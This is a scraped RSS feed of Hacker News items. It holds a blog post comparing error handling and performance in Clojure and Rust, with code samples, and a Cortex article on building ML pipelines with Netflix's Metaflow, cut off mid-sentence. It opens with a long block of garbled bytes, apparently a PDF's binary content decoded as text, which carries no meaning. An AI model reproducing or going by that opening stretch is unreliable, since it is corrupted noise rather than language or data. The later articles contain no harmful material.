&nbsp;hI$ÃrÃÂ¾ÃºS4Ã—&lt;0Â¶â„¢Ãâ€Âº]Ã‹\Â©HÂªË†Ã«A	Ã ÃuÃ•)0Ã°â€¡mÂ³%Bâ€Å’
Y1â€¦â€ b8Â¾5:'Å’ÃˆÅ¸ryÃœâ€¦2lâ€°}ÃªÃœiÂºYÃštâ€¦%YÂµÂ¹vÂ¥_Ã†dÆ’Â¬Â²â€”ï¿½Å¡sdRÃ•Ã’â€“Ã²Ã’Ã£o%Ã¢Ã«Å½(Â¬Ã‘Tï¿½Ã¨Â¥cÂ¤cÂ½Å“[Â«â€d&gt;Â¶Ã°Ã“4Â·*%Ã˜KÅ½Â­	uhâ€”RÃšRâ€â€¢Ã—~PoÂ¦jCÃ–Ã¥1Â·ZÃ…ÃœÃ‚Zâ€“â€œTâ€º3â„¢Â±â€˜â„¢ï¿½	Ãâ€¢
Â­k2â€Å“Ã–7Â¸Ã—uÂ¨â‚¬Ã‘â€¦Ã¬P&amp;0PÂ©ï¿½dÃµEj	GT
Å¡Â¬ÃšÃ”Â®ÃªwÆ’Ã¢Ã¯?â€¹Ã¢Å RÃÂ«eÂ´ï¿½Â¦â€˜â€“ï¿½.â€˜Â½QQÂ©&lt;â€ #XËœÅ“Ã‚d\â€”\â€šÃœÃƒÃŠQ(FRÅ“Ã)Jï¿½R3ZÃ‘ZÃ±V[Ã2ÂªRUEÂ¥DÂ¤%#8Q4ÃÂ¥9Å½Ã‘ÃÃšwJâ€°nÃªnwÃœÃ¼Ã‡dÃŒGâ€™`â€ Ãš[
Ã•Ã‡\
ZBÃ«ÃÃŠjâ‚¬n	Å¾(Ã“aËœÂ¶Ãˆ-
Ã…y$\â€ 1Ã­Ã–Â§Ã…â€ Æ’Ã§qJâ€RUâ€™â€#*â€™â€“Ã·ÃªÅ½Ã†'Â°Â©)Â¬â€¢#o!.ÃŒÂºâ€Â¶Â¤OAZs6â€Ã¥VjÃ‚*ÃÃ¶ÃˆÂ¤#ï¿½Ãˆn+rÂ®ÃŒ*IÃ|Ã„â€¦QNÂ·â€˜iÃŒRIâ€™Â¤f=ÂµAhï¿½Ã‚&amp;Ã†3Å’MÃ¢Ã¨BÃ˜TÃ‰â„¢m.2â€˜Â¿KLÂ©#ï¿½Ã¨3ZÂ®ï¿½MÂ©Ã‡LÂ³hQï¿½dÂª&amp;$WÂ«sÂ³Ã­Ã‹Â¥Â¶%ÃÃ©Ãˆâ€šÃ›JJJ	]	EV&nbsp;@Â­I'SÃ—6ï¿½Ã™5â€ aÂ²ËœvÃ—&lt;8Â¥Â¸_q\+Â·Bâ€â€¹Ã¥Ã—Ao0Ã›Ã›ï¿½LÅ¡IÃ§â€ RÃ£xuÂºËœÂ¾Ãµ#Â§4Â§,WÃ»Â¯ÃœÃ¤Â¼Â³
Â¯ï¿½/%YÃ¹Ã‘Ã¹VÃ‘Â³qÂ´Â¶3,%JÃcÃ˜ucNâ€“Ã¢Ã“zÃˆÃ›Ã‚Ã¢vï¿½Ã²jIÂ£FÂ«5h@â€°Ã#aÃ©PjÂ²â€¹@@Â©9â€Â¥Ã©Ã†`Â©	DÅ’â€“â€”Ã–Â¥,Â´XbÃ‰KÂ´Â¥Tï¿½Ã©IÃ™ï¿½TUZÂ¯#YI=Ã‡HJÂ²Ã¬Å“Â¨}Ã½Å Ã²;2U@
Vâ€â€¦Ã¯â€¦EÃ•&nbsp;Ã¥â€ Â³ËœÂ¢Â±Ã°Ã¥Â¶â€™â€)Â²2Â¢â„¢Å“&nbsp;Â¢â€(Ã…Â·Ã¥ZÃ±u8lâ€˜86Ã¢Â¹Ãˆ<iâ€ dÂ¢Ã‹mÃŒÅ¡ï¿½Å ÃªÃ¨qvvwÅ“â€“ÃœÃ„Ãƒ,"eÂ©e Ã©Ã‰Å“â€ï¿½ovÂ¡*Ã”â€˜n*Å“mÃ‡w[Ë†="" cÃlÃb#o0Ã¥clÂ¯6ï¿½j="" Ã¥nÂµ="kÃ,Â³NÂ®_s.Â³Å¡aÂ¼â€¦.Ã‚â€šJCv" !@"y4&â€¢Â¿`Ã¯="" okr]â„¢â€ Ã¥Å¡^="" Â£0Â¶ÃœÃ˜Ã­uwttoâ€aÂ ="{Gr0iÃÅ¡ÃÂ¼Ã±Â«â€˜)iÃ‚[Ã½myo@Â»&nbsp;}Â¬;Å¸Ã¥ï¿½Ã¤Â»9â€ºJâ€“JÅ ÃˆÂ¢Tkbjn9nFXÂ¿Â¹iâ€°â€“Ã†d!&nbsp;â€Â¡JÂ¦j'0" $eÂµopcÃ­Ã–Ã¡Â»â€ºÃ„â„¢Å“Å¡â€ºiâ„¢tÂ¦â‚¬yï¿½Â¦â€¦)="" nÃ·Â®d6Ã…Ã·a="" pâ€“Â°|]iâ€™jkÂ¡Â¥0r*]xÃ´â€°m*â€˜]Ãµâ‚¬Â¶Â¢Ã‘Ã†Ãœï¿½Â¹Ã£Ã¸â€Â¾*Ã®ÃªcÃŒÂ­jqxcÃ¨aÂ¡5jaiÂ fpï¿½Â¾Â¦â€“Ë†ÃÃ’oÃ£â€ºÂ â€ºfnemÂ¯))iÂ ï¿½Â£`$ï¿½â€y)="" !Ã”Ã°frz]ÃÃ°mÃ†ï¿½yn-;2Ã Â­6Ãªhh(olÂ¶.uÂ¤1~giÃŠÃŠ8Ã£a!![5ï¿½Â¢â€™s#0Ã©iÃ¤Â¬Â´`(Ã‚zjnzâ€™c5Ã¢="" 'tÃ©â„¢[rÃ­nÂºÃ”Â¶mÂ¢Å½Ã•yhï¿½Â¦q]k[k3Â´â€â€“â€ºi9â€šâ€™lÃ¢â€d(â€šÂ²kÂ¨Â¡\â€˜!ï¿½ÃˆÂ¸="" 3hbÅ“eâ€¢,*eÃï¿½*Â r@vbhÃ’Â¢Ã¤â€˜â€°Â·*ÃªÃœsË†c[Æ’t&Ã„hi:ua0hd0(dÂ¢Â¬="" nmcÂ­&Â¤Ã–â‚¬Ã˜Ã”Ã“ÂºeË†â€Â¥76â‚¬ÃŠ0Â¦Ã±dÂ¹naÃ«Å wÂ¸:mdÃ”Ã…iâ„¢â€”Ã¿Ã’9ÃƒÃ±Â¤46s5Ã‹nÂ¼="Ã„&amp;e'Å¡" â€¢e="" mÂ¯Ã—ï¿½ÂµÃ«a="" 72Ã£c*td)gfâ€“Â¤Æ’upÃ’Âºeâ€¹nÂ«Å¸â€”="" 4Ãªâ„¢k2â€“â€“ÃÂ¢Â²((Âªâ‚¬ï¿½Â©Â Ã¬`Ã©aÂ§ï¿½s9tÃ“{ÃºÃÃ•Ã¬6^i*[Â¨iÃ‹Ã‹="" !e="" â€!â€Ã³lÃƒp7zÃƒ&j(râ€Å¡="" $Å¡â€Ã°Â´Ã–Ã¼Â°Ã¶kâ€ºËœzâ€”â€™jc"ÂªeÂ¢Â¥<dÃª3ï¿½â€="">â€]AJâ€™!Â¯yÂ¬4VÃ¤Â¤â€“sÂ´UTÃ«TÂ¤Å½Ã±Â§Ã•(Y~lâ€œÃ­â€)Ã¹ÂµUAÃ•Â¶râ€¦VÅ NÂ´tP
Â¡Â­Ej9a0Â½ÃÅ’'sÃ§e:Ãq	SÃ‰JÃ«fÃZâ€“Ã¢
Ã·Ã„ÃšÃ°j76Â¤â€šPÃ¯Râ„¢XhÃ¦Ã£â€Ã…Ãœw0&nbsp;ÃƒÃ§Å’â€ Æ’&amp;Â¡ (â€¦â€¡fâ€°Å’EËœÂ¿Ãâ‚¬&gt;â€¦Â¡R.Â¤,dÃÂ¹t&nbsp;VÃ©&amp;Â¹VxÃ•~Ã¿Å Ã³Bkâ€zXÃŠÂ¸Ã‘x%$Â·â€jÅ“Â¢Ã¹IÂ¦Ã¼Ã´ÃÃ¦uÃÃ…Â¶-Å¸(:UÂ±
ÃœÃœ[7TÅ¸rÂ¦ï¿½N(Â¥
&nbsp;â€”Â»â€ ÃÅ“zmÃ‰wz4Â¯;(%t&nbsp;&nbsp;(	Â©Â¥ÃoÂ°mÃÂ³â€ ÃÂ¿8Â¹W\AÂ³JÃ‚â€Â¨XÂ¤\$â€™Njj-FÃ¢â€™â€œPÂ¤|Ãƒ/fâ€”[ÃÃ„iHaÃ»Ã€1&nbsp;D&amp;â€”nÃ£qÂ¥kÃ¦Â®gÃ°â€œâ€ 8Â§&gt;BÃ¡JÃ² Ã¬Ã”â€&nbsp;'"Lâ€â€ºÃ²Ë†â‚¬Ã.Ã­_Ãâ€¹R[2NU,Â¬Â¨ï¿½Ã¨HJhTÃšÃ kÃ'&amp;Â·58ÂµQÃ­Å¡Ã•KÂ«Å’Ã“JÃš9Â¹GÃ‚HÂ£Ã—Â°â‚¬Ã™/,ÂµDVÂ«\&lt;Â±vÃƒÃ—X%Â°yÃzÃ‚Po&gt;Lï¿½9Ã“â€œ!H% i@Å¡â€¢6ÂºFÂ°Ã¡Â¡Â´Â¸ÃˆQJâ€šÃ”EÅ Â¨(
jâ€rÂ¤XÃ·â€š3Â¹'Â¸Æ’u1Â¡Â¸Ã·Â«Âª;Â¬V\Â±Uo[lÃ˜Zâ€¢Â³3ÃšËœÃŒÃ‰ËœÆ’UXÂ§Å¡JÃ–Ã”â€šÃ‚ÃšqrÂ¡Â¬&lt;Ã«uHÃ²&nbsp;ï¿½Â³Â°ÂªxÃ»ÃƒgÃ·=3,Â¹gÂ¤Ã™Z^whÃ½	NÃ• Ã•
+%:Â§
Ã‡Â»[Â©uÂ¡fÃ·"â€ï¿½Ã²Ã“Ã˜Â°6Ã“ LXÂ´â€º,Â¼iÂ¦ÃšiÂ¢I5dÃÂ£gÂ·oâ€°bRÃK.U8Å“Â®*Âª%@Pâ€™,2Â¦â‚¬Ã‡NÃ®Ã—yâ€šÃ‰â€œhÂ©cÂ¢-ej.*â€Jâ€“*Ã‹Ã„4â€°Ã†w'(â€¹Â©Ã…Âµ,ï¿½ÃŒaÃ‰Ã•%]s5lV`Å Â¤ Å“4Ã·;%oÂ´â€œGâ€Uâ„¢K&amp;Â¥fÃ´'ï¿½h!tcËœÃ›Ã‰
5(Ã˜Ã”#ZÂ¤Â«â€Â®Âªï¿½)Ã“Å 
Ã€0Ã”&nbsp;Ãˆ={Ã„Å’Â®,Æ’Pâ€&nbsp;
â€ -â€™Â¢,â€°â€šÂ®Ã—â€Ã¢xÂ¼ÃŠLÃœÂ£vHo&gt;Ã¼â‚¬â€¹Ã±TWSs{Å¾XÅ¾â€“Ã¦h_ËœsÅ¡Ã…Ã„Â»â€°ÃŸ%â€“Ã›^Ã‰Ã€Â²Â¨:Ã„AZÅ¡BNÃ¶mc.UFDÃ&nbsp;Ã—Æ’`â€°ÃƒVÂ§Ã¡uE9A k`"mâ€ZZ8NLâ€Ã”Ã¦Ã¢HÃ†Ã•Â¬DF+Ã¿Ã“'Â¡	ÃHÃ™PRhÂ¤Å Ã†Â§Â§eÂ¤ËœrjiimÂ¦ÃRâ€“Â¢;â„¢Â´ÃÃ®Ã‹
â„¢+â€Yiâ€¦tÂ¤Râ€¹ÂµÃ‰Ã¢)Ã¬`Ã¤Ã˜tÃ±Ã¥iÂªÃ MÂ¹Ã³Âºâ€“wâ€˜ÃŠâ„¢q4ÃŒ{Ã¿]Å“Â¸95sm8Â¢Ã²ÃŠ6Ã™vâ€/Â´Ã¢6Â¬(Ã†Ã©Â·:â€ Ã’â€œ&gt;â€¦PEgÂ¢â€¦Ãªâ€¡hlÂ¡Ã¦IÃ£Ã¯)â€¹8ZÃ‚Â°RJRfrÃ¶Ã˜jÃ â€¹6m&nbsp;	|â€œJvÂ³ï¿½KÂºâ€˜ÃÃ­â€ IÂ²â‚¬ÃÃ¾Â¼
ÂµÂºÃœ,ÃŒÂ¬â€¢ï¿½Ã¢].Â¨Â¡Â½Â¦Ã¹:ï¿½Ã•Ã«{Â¬ÃÅ 0Â½Â­RÃ“.Â¯-(Ã›FÂ»Ã™ï¿½JÂ­_Ã”ÃŒÂ¶,Ã¦mjlFâ€¢â€º Ã¶Ã˜jÃ Â¤Â¹Ã•5	ÃŒÅ¡Å“Â·"Âµ;#(Ã%ZRâ€“lJâ€¦ï¿½5Â¦Â±ÃÃ«0&nbsp;â€Ã¤LÃ›Â¥Ã¡â€â€ %Ã–ï¿½Ã¨AfÃ‰Ã©â€ºmMÃTFÃ­pÃµÂ§.Ã‚rd?pâ€“SI|&amp;Â´
Ã›Â¡Ã—Ã›}ZÃŸ/qâ€¹8)Â±
Wâ€º/-PN'Ã§Â§\s!HQÂªEÃÃ’Ã±Ã¤Å¡Ã«Å“Â¥@Ã¨aÃ€ÃtÂ´Ã‰JLâ€Ã¬Ã’Â¡â€¢Ã™Â¦hÂ¦Â´"Â©Ã¨mÂ¢Â·7cuâ€”ÂºÃ¥Ãâ€˜â€Ã¢aÃ Â¥Å“ÃŒ%Â´ÃdÂ©,eÃ¨IFÂ©OMÃ•Ã£Ã‰lYÃœbÃ‹Â¥YÂ·
Ã²ÃˆÂ·â€Ã2Â´TVJEUÂ½6Â¦ÃšZ2cnÂ¤Ã¤SeÂ°ï¿½Ã±HÂ±Ã£Â¿XÃ‡onÂ¢aÃ”%jÃÂ§&amp;â€™Ã¶g^Je5	â€¦</iâ€ dÂ¢Ã«mÃ¬Å¡ï¿½Å¡ÃªÃ¨qvvwÅ“â€“Ã¼Ã¤Ã£,"eÂ©e></qâ„¢Ã¬Ã´Ã¯Â®umâ€“mÃ«></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.emcdda.europa.eu/system/files/publications/13464/20205648_TD0320796ENN_PDF_rev.pdf">https://www.emcdda.europa.eu/system/files/publications/13464/20205648_TD0320796ENN_PDF_rev.pdf</a></em></p>]]>
            </description>
            <link>https://www.emcdda.europa.eu/system/files/publications/13464/20205648_TD0320796ENN_PDF_rev.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25497079</guid>
            <pubDate>Mon, 21 Dec 2020 17:25:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I rewrote a Clojure tool in Rust]]>
            </title>
            <description>
<![CDATA[
Score 167 | Comments 73 (<a href="https://news.ycombinator.com/item?id=25497050">thread link</a>) | @praveenperera
<br/>
December 21, 2020 | https://timofreiberg.github.io/clojure-vs-rust/ | <a href="https://web.archive.org/web/*/https://timofreiberg.github.io/clojure-vs-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
        <div>
            
<p>2020-12-20</p>


<p>About two years ago, I wrote a quite complicated diff tool in Clojure.<br>
It was complicated enough that I struggled to fit the algorithm in my head and the inputs were large enough that I had to make some efforts to improve performance.</p>
<p>About half a year later, I started learning Rust, ported the current state of the Clojure program into Rust, was very happy with the change<sup><a href="#hooked-on-rust">1</a></sup> and continued exclusively with Rust.<br>
While working on that project, I've developed some opinions about the two languages, especially about error handling and performance:</p>
<p>I think that these are areas where Rust excels, while they are among the weaker spots of Clojure<sup><a href="#not-hating-on-clojure">2</a></sup>.</p>
<p>To put my experience in context:
I had a bit more than one year of experience in Clojure when I moved to Rust.
The diff tool was by far the largest Clojure program I've ever written, and it was only about 3000 lines.<br>
When I started writing Rust, reimplementing the existing Clojure code was among my first Rust code.
I've continued learning Rust since then and have mostly stopped writing Clojure.<br>
If things have changed in Clojure recently, please let me know and I'll update the article.</p>
<h2 id="error-handling"><a href="#error-handling" aria-label="Anchor link for: error-handling">ğŸ”—</a>Error Handling</h2>
<p>The error handling requirements in this project were not very complicated.
All errors just needed to be logged and returned to the user.<br>
The only slightly unusual requirement was that parsing and validation logic should show all errors for each row in both uploaded excel files
(instead of just the first error) so I had to accumulate errors.</p>
<h3 id="error-handling-in-clojure"><a href="#error-handling-in-clojure" aria-label="Anchor link for: error-handling-in-clojure">ğŸ”—</a>Error Handling in Clojure</h3>
<p>Error handling in Clojure is not opinionated.<br>
<a href="https://lispcast.com/clojure-error-messages-accidental/">Similar to error messages</a>
, what error handling idioms exist in Clojure seem to me to be largely accidental or inherited from Java.</p>
<p>The standard library mostly supports <a href="https://clojuredocs.org/clojure.core/ex-info">exceptions</a>.<br>
There are some libraries that support returning error values instead of throwing exceptions like the error handling library <a href="https://github.com/adambard/failjure"><code>failjure</code></a>.<br>
Others, like the parsing library <a href="https://github.com/Engelberg/instaparse"><code>instaparse</code></a>, return their own custom error values<sup><a href="#insta-result">3</a></sup>.</p>
<p>I used failjure to help accumulate errors in a nicer way (and because it appealed to my Haskell-influenced taste).</p>
<p>Let's look at a Clojure function from my diff tool that uses <a href="https://github.com/adambard/failjure#attempt-all">attempt-all</a> to parse and validate the input data.
If any errors occur, all errors are aggregated into a string:</p>
<pre><code><span>(</span><span>defn </span><span>parse
  </span><span>[country-mapping data]
  #_"</span><span>   ğŸ‘‡ the attempt-all function exits early 
           if any binding returned a failure</span><span>"
  (</span><span>fail/attempt-all
   </span><span>[headers (</span><span>header-row</span><span> data)
    parsed (</span><span>map
             </span><span>#(</span><span>parse-rule</span><span> headers country-mapping %)
             (</span><span>content-rows</span><span> data))
    #_"</span><span>           ğŸ‘‡ list of failures is aggregated here</span><span>"
    failed-parses (</span><span>-&gt;&gt;</span><span> parsed
                    (</span><span>filter</span><span> fail/failed?)
                    (</span><span>map</span><span> fail/message))
    #_"</span><span>          ğŸ‘‡ this can return a failure,
                    triggering an early exit</span><span>"
    parse-result (</span><span>if </span><span>(</span><span>empty?</span><span> failed-parses)
                   parsed
                   #_"</span><span>ğŸ‘‡ a single failure value containing the
                         list of failures concatenated into a string</span><span>"
                   (</span><span>fail/fail
                    </span><span>(</span><span>let </span><span>[msg (</span><span>str
                               </span><span>"</span><span>Failed to parse </span><span>"
                               (</span><span>count</span><span> failed-parses)
                               "</span><span> rules:</span><span>")]
                      (</span><span>str</span><span> msg "</span><span>\n</span><span>" failed-parses))))
    #_"</span><span>          ğŸ‘‡ This can also return a failure</span><span>"
    spec-result (</span><span>util/check-specs </span><span>"</span><span>Rules</span><span>"
                                  </span><span>:rule/id
                                  ::spec/rule</span><span>
                                  parse-result)]
   #_"</span><span>ğŸ‘‡ if everything was successful, this is returned</span><span>"
   spec-result
   #_"</span><span>ğŸ‘‡ if any failure occurred, this is returned</span><span>"
   (</span><span>fail/when-failed </span><span>[failure]
                       (</span><span>do
                         </span><span>(</span><span>log/warn
                           </span><span>(</span><span>str </span><span>"</span><span>Failed to parse data </span><span>"
                             data "</span><span>:</span><span>\n</span><span>" (</span><span>fail/message</span><span> failure)))
                         failure))))
</span></code></pre>
<p>Nice things about this:</p>
<ul>
<li>The identifier-expression pairs in the square brackets use the same syntax as Clojure's <a href="https://clojuredocs.org/clojure.core/let"><code>let</code>-form</a>
which makes it look familiar.</li>
<li>I can optionally add an error handling function to the very end, which is helpful to, e.g., log the argument of the function, as I did here.</li>
</ul>
<p>Not so nice things about this:</p>
<ul>
<li>I can't see which functions can actually fail. I have to read them to find out.</li>
<li>Since the Clojure ecosystem doesn't have a uniform error handling style, I have to manually convert exceptions or other errors like <code>instaparse</code> error values to <code>failjure</code> errors.</li>
</ul>
<p>My verdict is:<br>
Since Clojure is a Lisp, it's possible to use most kinds of error handling and make it look fine, if you really want to.
The most pragmatic solution in most cases will be to use exceptions.</p>
<p>I found that readability could suffer when using less explicit error handling, especially in a dynamic language.</p>
<p>Due to the freedom of choice in error handling approacher, I was tempted to experiment more than with a more opinionated language.</p>
<h3 id="error-handling-in-rust"><a href="#error-handling-in-rust" aria-label="Anchor link for: error-handling-in-rust">ğŸ”—</a>Error handling in Rust</h3>
<p>Rust is quite opinionated about error handling.
The Rust community has worked on developing and improving common idioms, some of which were incorporated into the standard library, thereby improving the baseline error handling.</p>
<p>There's no improvement without change though, and the frequent changes have been a source of complaints.
While backwards compatibility was never broken, people that wanted their code to be idiomatic had to update it anyway.
Old tutorials and guides have therefore also become outdated.</p>
<p>There are lots of good, up-to-date articles about error handling in Rust<sup><a href="#rust-error-handling-links">4</a></sup>, which help learn the current idioms.</p>
<p>In Rust, functions that can error return the <a href="https://doc.rust-lang.org/std/result/index.html"><code>Result</code></a> type<sup><a href="#panic-ref">5</a></sup>.<br>
There are several libraries that make creating your own errors or handling errors from libraries easier, but they (mostly) just use the types from the standard library instead of introducing new stuff that's incompatible with the rest of the ecosystem.</p>
<p>Let's look at the same function as before, but this time in Rust:</p>
<pre><code><span>pub fn </span><span>parse</span><span>(
    </span><span>workbook</span><span>: &amp;</span><span>mut</span><span> Workbook,
    </span><span>country_mapping</span><span>: CountryMapping,
) -&gt; Result&lt;Vec&lt;Rule&gt;&gt; {
    </span><span>let</span><span> range = workbook
        .</span><span>worksheet_range</span><span>("</span><span>Rules</span><span>")
        </span><span>// this question mark triggers an early exit
        // there are two because we have an Option
        // containing a Result                    ğŸ‘‡
        </span><span>.</span><span>ok_or</span><span>(format_err!("</span><span>Missing Rules sheet</span><span>"))??;
        </span><span>//                               ğŸ‘‡
    </span><span>let</span><span> range = </span><span>skip_to_header_row</span><span>(range)?;
    </span><span>let</span><span> parsed = RangeDeserializerBuilder::new()
        .</span><span>has_headers</span><span>(</span><span>true</span><span>)
        .</span><span>from_range</span><span>(&amp;range)
        </span><span>//                                    ğŸ‘‡
        </span><span>.</span><span>context</span><span>("</span><span>Failed to read Rules sheet</span><span>")?;
    </span><span>let</span><span> rules = </span><span>collect_errs</span><span>(parsed.</span><span>map</span><span>(|</span><span>parse_result</span><span>| {
        parse_result
            </span><span>// ğŸ‘‡ mapping a lambda over the error value
            </span><span>.</span><span>map_err</span><span>(|</span><span>e</span><span>| e.</span><span>into</span><span>())
            </span><span>// ğŸ‘‡ this would be called flatMap in some other languages
            </span><span>.</span><span>and_then</span><span>(|</span><span>row</span><span>| row.</span><span>parse</span><span>(&amp;country_mapping))
    }))
    </span><span>// ğŸ‘‡ this converts a list of errors into a single error
    //    containing a string
    </span><span>.</span><span>map_err</span><span>(|</span><span>es</span><span>| {
        format_err!(
            "</span><span>Failed to parse {} rules:</span><span>\n</span><span>{}</span><span>",
            es.</span><span>len</span><span>(),
            </span><span>// ğŸ‘‡ very elegant...
            //    this would just be one .joinToString call in Kotlin
</span><span>            es.</span><span>into_iter</span><span>()
                .</span><span>map</span><span>(|</span><span>e</span><span>| e.</span><span>to_string</span><span>())
                .collect::&lt;Vec&lt;_&gt;&gt;()
                .</span><span>join</span><span>("</span><span>\n</span><span>")
        )
   </span><span>// ğŸ‘‡
    </span><span>})?;
    Ok(rules)
}
</span></code></pre>
<p>Nice things about this:</p>
<ul>
<li>The standard library, every Rust library I've ever seen and my own application code is always using the same <a href="https://doc.rust-lang.org/std/result/enum.Result.html"><code>Result</code></a> type, which keeps things pretty compatible.</li>
<li><a href="https://doc.rust-lang.org/edition-guide/rust-2018/error-handling-and-panics/the-question-mark-operator-for-easier-error-handling.html">The <code>?</code> operator</a> makes fallible functions visible but keeps it succinct.<br>
It also automatically converts error types where possible, which reduces the need for manual type conversion.</li>
<li>The error type I'm using here from the library <a href="https://docs.rs/anyhow/*/anyhow/index.html"><code>anyhow</code></a> supports a <a href="https://docs.rs/anyhow/*/anyhow/trait.Context.html"><code>.context</code></a> method, which gives otherwise unhelpful low-level errors the necessary context.<br>
This is usually done in exception-based languages by catching, wrapping and rethrowing, but this looks a lot more pleasant.</li>
</ul>
<p>Not so nice things about this:</p>
<ul>
<li>I have to keep the error types compatible, which I accomplish in this case by not distinguishing between different error types at all<sup><a href="#anyhow-usecase">6</a></sup>.<br>
I still have to return a single error value, which means I have to manually and verbosely convert the list of errors into a single one - in this case a newline-delimited string.</li>
<li>If I want to log something when this entire function returns an error or add some <code>.context</code> to it, I would like to have the equivalent of a <code>try/catch</code>-block around the entire function body.<br>
This doesn't exist yet<sup><a href="#try-blocks">7</a></sup>, the current best practice seems to be do move the entire body into an inner function or lambda.</li>
</ul>
<p>My verdict is:<br>
In Rust, you will use the <code>Result</code> type and you will like it<sup><a href="#and-you'll-like-it">8</a></sup>.<br>
The main design decisions are whether you use some of the helper libraries and how you design your error types.</p>
<p>Designing the error types can be a challenge though, especially because it's a bit different than designing e.g. Java exception hierarchies.<br>
I was lucky that keeping up to date with the evolving error handling idioms wasn't too hard for me as I was not under time pressure and often worked in my spare time with learning as my primary objective.
It might have been painful for teams maintaining bigger production systems.<br>
The large number of error handling tutorials and articles should hopefully make it easier to learn now than it was a few years ago.</p>
<p>The learning curve aside:
To me, Rust's error handling feels like part of the secret sauce that makes it the most promising language for correctness that I know of.</p>
<h2 id="performance"><a href="#performance" aria-label="Anchor link for: performance">ğŸ”—</a>Performance</h2>
<p>The part of the program that caused performance issues was the diff algorithm and, to a slightly lesser extent, a data normalization step before that.<br>
The type of performance problems I had were mostly being CPU bound, having to generate and compare a lot of temporary data.
The large amount of data also often caused memory issues in both languages.</p>
<h3 id="clojure-performance"><a href="#clojure-performance" aria-label="Anchor link for: clojure-performance">ğŸ”—</a>Clojure Performance</h3>
<p>In â€¦</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://timofreiberg.github.io/clojure-vs-rust/">https://timofreiberg.github.io/clojure-vs-rust/</a></em></p>]]>
            </description>
            <link>https://timofreiberg.github.io/clojure-vs-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25497050</guid>
            <pubDate>Mon, 21 Dec 2020 17:23:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Netflix's Metaflow: Reproducible machine learning pipelines]]>
            </title>
            <description>
<![CDATA[
Score 250 | Comments 101 (<a href="https://news.ycombinator.com/item?id=25497008">thread link</a>) | @ChefboyOG
<br/>
December 21, 2020 | https://www.cortex.dev/post/reproducible-machine-learning-pipelines-with-metaflow-and-cortex | <a href="https://web.archive.org/web/*/https://www.cortex.dev/post/reproducible-machine-learning-pipelines-with-metaflow-and-cortex">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><h4>From training to deployment with Metaflow and Cortex</h4></p><div content-type="article"><p>If we were to design an optimal machine learning pipeline, it would be:</p><ul role="list"><li><strong>Scalable</strong>. As workloads increased, it would scale up without issue.</li><li><strong>Reproducible</strong>. We would be able to draw a line from any model to its data.</li><li><strong>Configurable</strong>. It wouldnâ€™t lock us into particular frameworks or tools.</li></ul><p>Typically, pipelines will tradeoff in at least one of these areas. A pipeline might be scalable, but will rely on a platform that puts limits on data scientists. Or, a pipeline will be completely configurable, but will also be glued together by a mess of ad hoc code and will be impossible to reproduce.</p><p>In this piece, I want to introduce a way to build this kind of ideal pipeline without any tradeoffs. To do this, weâ€™ll be using <a href="https://metaflow.org/" target="_blank">Metaflow, the open source data science framework from Netflix</a>, and <a href="https://github.com/cortexlabs/cortex" target="_blank">Cortex, our open source deployment platform for machine learning</a>. </p><p>Letâ€™s start by defining our pipeline.</p><h3>Defining a pipeline in Metaflow</h3><p>Metaflow is a data science framework that provides a single API for managing different pieces of the infrastructure stack. It places an emphasis on scalability, reproducibility, and usability.</p><div><p>
	<iframe width="560" height="315" src="https://www.youtube.com/embed/XV5VGddmP24" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></div><p>At a high level, Metaflow allows us to define pipelines as DAGs, called â€œflows,â€ in which data undergoes a sequence of transformations called â€steps.â€ These steps persist transformed data as â€œdata artifacts,â€ which are accessible by subsequent steps throughout the flow. </p><p>For example, say we had a training flow that loaded data (probably produced by another flow), trained multiple models with different strategies, evaluated the different models, and saved the top performer:</p><p>This is just a snapshot of our full pipeline, which Iâ€™ll be adding to in the next section, but even with just this snippet we have a repeatable training pipeline that can scale to run on many machines. We also have, thanks to Metaflowâ€™s Client API, a way to version, audit, and reproduce these training runs.</p><p>For example, to instantiate a given step from a previous flow, we can simply pass in the flow name, run id, and step name to the Metaflow Client:</p><p>To access an artifact from a particular run, the logic is very similar:</p><p>This means that every time a flow is executed, Metaflow automatically versions and records it using a standard taxonomy. As a result, we can trace any given modelâ€™s lineage from raw data to final export. </p><p>There is much more to Metaflow, and Iâ€™d encourage you to check out their <a href="https://docs.metaflow.org/" target="_blank">documentation</a> to learn more, but as an introduction, this should serve to get us started. </p><p>Now, letâ€™s talk a bit about triggering deployments in Metaflow.</p><h3>Deploying models with Cortex</h3><p>In this section, Iâ€™m going to take our training flow from before and add a step for deploying our model as a production API on AWS. To do this, weâ€™re going to use Cortex.</p><p>Cortex is a deployment platform for machine learning. On the surface, it provides simple interfaces for building prediction services, deploying them to production, and managing an inference cluster. </p><p>Under the hood, Cortex automates all of the cloud infrastructure needed for inferenceâ€”autoscaling, GPU/ASIC support, load balancing, prediction tracking, etcâ€”and implements a automated deployment process in which model serving code is packaged, versioned, and deployed to the cluster.</p><p>We can trigger a deployment using Cortexâ€™s Python client within our training flow like this:</p><p>Youâ€™ll notice the client includes a deploy() method, which takes a configuration object for defining our API. This configuration works with the Metaflow client to extract the location of the model, and the metadata of the flow for logging purposes. Now, when we audit our deployments, we can connect it all the way back to the run that produced it, extending our lineage from data to deployment.</p><p>The configuration object also references a predict.py script, which is where the actual prediction service is defined. A Cortex predictor looks like this:</p><p>The structure is very simple. We initialize our model in the init() function, which runs on initial deployment, and we generate predictions in the predict() function. Similar to steps in Metaflow, these Python methods can contain whatever logic you want to implement.</p><p>Now, when we run the flow, the model will be trained, evaluated, and deployed to production with zero downtime or extra configuration needed. </p><p>Because Cortex provides native support for A/B testing and traffic splitting, we can even run complex deployment strategies without breaking Metaflowâ€™s lineage.</p><p>For example, if after selecting a best model, we wanted to test how the model performed in different formatsâ€”say ONNX vs TensorFlowâ€”we could export two versions of the model, deploy them both in an A/B test, and log their performance. Because our training flow is connected to our deployment, we can then pass this information back and forth between Cortex and Metaflow without issue.</p><h3>An easier path to production machine learning</h3><p>Over the years, a number of end-to-end data science platforms have been released, and most of them fall into 